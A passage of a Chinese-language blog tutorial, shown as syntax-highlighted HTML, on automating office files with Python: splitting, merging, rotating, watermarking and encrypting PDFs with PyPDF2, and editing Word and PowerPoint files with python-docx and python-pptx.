punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>new_row<span class="token operator">+=</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>new_table<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>行内条件判断</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">x<span class="token operator">=</span><span class="token number">5</span>y<span class="token operator">=</span>x<span class="token operator">*</span><span class="token number">2</span> <span class="token keyword">if</span> x<span class="token operator">&lt;</span><span class="token number">10</span> <span class="token keyword">else</span> <span class="token number">20</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="PDF合并及分割"><a href="#PDF合并及分割" class="headerlink" title="PDF合并及分割"></a>PDF合并及分割</h3><h4 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'./1/lab-page-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>page<span class="token punctuation">&#125;</span></span><span class="token string">.pdf'</span></span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>        pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'./1/lab-page-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>page<span class="token punctuation">&#125;</span></span><span class="token string">.pdf'</span></span><span class="token punctuation">)</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'merge.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="旋转及排序PDF"><a href="#旋转及排序PDF" class="headerlink" title="旋转及排序PDF"></a>旋转及排序PDF</h3><h4 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span>page<span class="token operator">=</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rotateClockwise<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span>page<span class="token operator">=</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rotateCounterClockwise<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'rotated.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#从最后一页开始，到第一页，每次递减一页</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'reordered.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="批量加水印"><a href="#批量加水印" class="headerlink" title="批量加水印"></a>批量加水印</h3><p>打开word，制作一个只有水印的页面，（将图片设为浮于文字上方即可自由拖动图片）保存为PDF</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriter<span class="token keyword">from</span> copy <span class="token keyword">import</span> copywatermark_pdf<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'shuiyin.pdf'</span><span class="token punctuation">)</span>watermark_page<span class="token operator">=</span>watermark_pdf<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    original_page<span class="token operator">=</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span>    new_page<span class="token operator">=</span>copy<span class="token punctuation">(</span>watermark_page<span class="token punctuation">)</span>    new_page<span class="token punctuation">.</span>mergePage<span class="token punctuation">(</span>original_page<span class="token punctuation">)</span>           <span class="token comment">#注意merge顺序，下面的内容.mergePage(出现在上面的内容)</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>new_page<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'shuiyined.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="批量加解密"><a href="#批量加解密" class="headerlink" title="批量加解密"></a>批量加解密</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriter<span class="token keyword">from</span> copy <span class="token keyword">import</span> copypdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span>pdf_writer<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token string">'ezy'</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'encrypted.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'encrypted.pdf'</span><span class="token punctuation">)</span>pdf_reader<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token string">'ezy'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'decrypted.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="处理word文件"><a href="#处理word文件" class="headerlink" title="处理word文件"></a>处理word文件</h2><h3 id="word文档结构"><a href="#word文档结构" class="headerlink" title="word文档结构"></a>word文档结构</h3><p>Document: 文档<br>Paragraph: 段落<br>Run: 文字块，样式相同的为一个块    </p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f2.png"></p><h3 id="提取文字"><a href="#提取文字" class="headerlink" title="提取文字"></a>提取文字</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx <span class="token keyword">import</span> Documentdoc<span class="token operator">=</span>Document<span class="token punctuation">(</span><span class="token string">'1.docx'</span><span class="token punctuation">)</span><span class="token keyword">for</span> paragraph <span class="token keyword">in</span> doc<span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提取文字块</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx <span class="token keyword">import</span> Documentdoc<span class="token operator">=</span>Document<span class="token punctuation">(</span><span class="token string">'1.docx'</span><span class="token punctuation">)</span>paragraph<span class="token operator">=</span>doc<span class="token punctuation">.</span>paragraphs<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>runs<span class="token operator">=</span>paragraph<span class="token punctuation">.</span>runs<span class="token keyword">for</span> run <span class="token keyword">in</span> runs<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="向word中写入内容"><a href="#向word中写入内容" class="headerlink" title="向word中写入内容"></a>向word中写入内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx <span class="token keyword">import</span> Document<span class="token keyword">from</span> docx<span class="token punctuation">.</span>shared <span class="token keyword">import</span> Cmdoc<span class="token operator">=</span>Document<span class="token punctuation">(</span><span class="token punctuation">)</span>doc<span class="token punctuation">.</span>add_heading<span class="token punctuation">(</span><span class="token string">'first heading'</span><span class="token punctuation">,</span>level<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment">#添加标题</span>paragraph1<span class="token operator">=</span>doc<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token string">'paragra1'</span><span class="token punctuation">)</span>        <span class="token comment">#添加段落</span>paragraph2<span class="token operator">=</span>doc<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token string">'paragra2'</span><span class="token punctuation">)</span>paragraph3<span class="token operator">=</span>doc<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#添加文字块</span>paragraph3<span class="token punctuation">.</span>add_run<span class="token punctuation">(</span><span class="token string">'加粗'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bold<span class="token operator">=</span><span class="token boolean">True</span>paragraph3<span class="token punctuation">.</span>add_run<span class="token punctuation">(</span><span class="token string">'普通'</span><span class="token punctuation">)</span>paragraph3<span class="token punctuation">.</span>add_run<span class="token punctuation">(</span><span class="token string">'斜体'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>italic<span class="token operator">=</span><span class="token boolean">True</span>doc<span class="token punctuation">.</span>add_page_break<span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token comment">#添加分页</span>doc<span class="token punctuation">.</span>add_picture<span class="token punctuation">(</span><span class="token string">'landscape.jpg'</span><span class="token punctuation">,</span>width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">#添加图片，需要导入Cm模块才能使用可选参数width,height，只给一个宽度或高度，另一个的尺寸会自动计算</span>records<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">,</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'grade'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token string">'Li lei'</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token string">'Han meimei'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token string">'Ma dongmei'</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">]</span><span class="token punctuation">]</span>table <span class="token operator">=</span>doc<span class="token punctuation">.</span>add_table<span class="token punctuation">(</span>rows<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>cols<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>             <span class="token comment">#添加表格</span><span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cells<span class="token operator">=</span>table<span class="token punctuation">.</span>rows<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">.</span>cells    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        cells<span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>doc<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'shili.docx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改样式"><a href="#修改样式" class="headerlink" title="修改样式"></a>修改样式</h3><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx <span class="token keyword">import</span> Document<span class="token keyword">from</span> docx<span class="token punctuation">.</span>shared <span class="token keyword">import</span> Pt<span class="token punctuation">,</span>RGBColor<span class="token keyword">from</span> docx<span class="token punctuation">.</span>oxml<span class="token punctuation">.</span>ns <span class="token keyword">import</span> qndoc<span class="token operator">=</span>Document<span class="token punctuation">(</span><span class="token string">'1.docx'</span><span class="token punctuation">)</span><span class="token keyword">for</span> paragraph <span class="token keyword">in</span> doc<span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>    <span class="token keyword">for</span> run <span class="token keyword">in</span> paragraph<span class="token punctuation">.</span>runs<span class="token punctuation">:</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>bold<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>italic<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>underline<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>strike<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>shadow<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>size<span class="token operator">=</span><span class="token boolean">True</span>        run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>color<span class="token punctuation">.</span>rgb<span class="token operator">=</span>RGBColor<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#设置中文字体样式需要借助qn模块</span>run<span class="token punctuation">.</span>font<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'微软雅黑'</span>r<span class="token operator">=</span>run<span class="token punctuation">.</span>_element<span class="token punctuation">.</span>rPr<span class="token punctuation">.</span>rFontsr<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>qn<span class="token punctuation">(</span><span class="token string">'w:eastAsia'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'微软雅黑'</span><span class="token punctuation">)</span>doc<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'1.docx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx<span class="token punctuation">.</span>enum<span class="token punctuation">.</span>text <span class="token keyword">import</span> WD_ALIGN_PARAGRAPHparagraph<span class="token punctuation">.</span>alignment<span class="token operator">=</span>WD_ALIGN_PARAGRAPH<span class="token punctuation">.</span>CENTER<span class="token comment">#可选的对齐方式 LEFT,CENTER,RIGHT,JUSTIFY,DISTRIBUTE,JUSTIFY_MED,JUSTIFY_HI,JUSTIFY_LOW,THAIJUSTIFY</span>paragraph<span class="token punctuation">.</span>paragraph_format<span class="token punctuation">.</span>line_spacing<span class="token operator">=</span><span class="token number">2.0</span>   <span class="token comment">#调整行间距，要用浮点数表示，2.0表示两倍行间距</span>paragraph<span class="token punctuation">.</span>paragraph_format<span class="token punctuation">.</span>space_before<span class="token operator">=</span>Pt<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment">#段前间距12磅</span>paragraph<span class="token punctuation">.</span>paragraph_format<span class="token punctuation">.</span>space_after<span class="token operator">=</span>Pt<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="处理PPT文件"><a href="#处理PPT文件" class="headerlink" title="处理PPT文件"></a>处理PPT文件</h2><h3 id="PPT文档结构"><a href="#PPT文档结构" class="headerlink" title="PPT文档结构"></a>PPT文档结构</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f3.png"></p><h3 id="读取内容"><a href="#读取内容" class="headerlink" title="读取内容"></a>读取内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentationprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span><span class="token keyword">for</span> slide <span class="token keyword">in</span> prs<span class="token punctuation">.</span>slides<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>slide<span class="token punctuation">)</span>    <span class="token keyword">for</span> shape <span class="token keyword">in</span> slide<span class="token punctuation">.</span>shapes<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>shape<span class="token punctuation">)</span>        <span class="token keyword">if</span> shape<span class="token punctuation">.</span>has_text_frame<span class="token punctuation">:</span>            <span class="token comment">#判断是否有文字</span>            text_frame<span class="token operator">=</span>shape<span class="token punctuation">.</span>text_frame     <span class="token comment">#获取文字框</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>text_frame<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">for</span> paragraph <span class="token keyword">in</span> text_frame<span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>     <span class="token comment">#获取paragraph中的段落</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="母版概念"><a href="#母版概念" class="headerlink" title="母版概念"></a>母版概念</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f4.png"></p><h3 id="查看母版信息"><a href="#查看母版信息" class="headerlink" title="查看母版信息"></a>查看母版信息</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentationprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#获取第一个母版，并用第一个母版生成一页PPT </span><span class="token keyword">for</span> shape <span class="token keyword">in</span> slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">:</span>                    <span class="token comment">#获取这一页所有的占位符</span>    phf<span class="token operator">=</span>shape<span class="token punctuation">.</span>placeholder_format    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>phf<span class="token punctuation">.</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>shape<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span></span><span class="token string">--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>phf<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    shape<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>phf<span class="token punctuation">.</span>idx<span class="token punctuation">&#125;</span></span><span class="token string">--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>phf<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>prs<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test.pptx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="根据占位符ID填写内容"><a href="#根据占位符ID填写内容" class="headerlink" title="根据占位符ID填写内容"></a>根据占位符ID填写内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pptx <span class="token keyword">import</span> Presentationprs<span class="token operator">=</span>Presentation<span class="token punctuation">(</span><span class="token string">'1.pptx'</span><span class="token punctuation">)</span>slide<span class="token operator">=</span>prs<span class="token punctuation">.</span>slides<span class="token punctuation">.</span>add_slide<span class="token punctuation">(</span>prs<span class="token punctuation">.</span>slide_layouts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    winner_name<span class="token operator">=</span>slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>certificate_type<span class="token operator">=</span>slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>this_is_to_certify_that<span class="token operator">=</span>slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span>winning_reason<span class="token operator">=</span>slide<span class="token punctuation">.</span>placeholders<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span>winner_name<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'Han Meimei'</span>certificate_type<span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token string">'三好学生奖状'</span>this_is_to_certify_that<span class="token 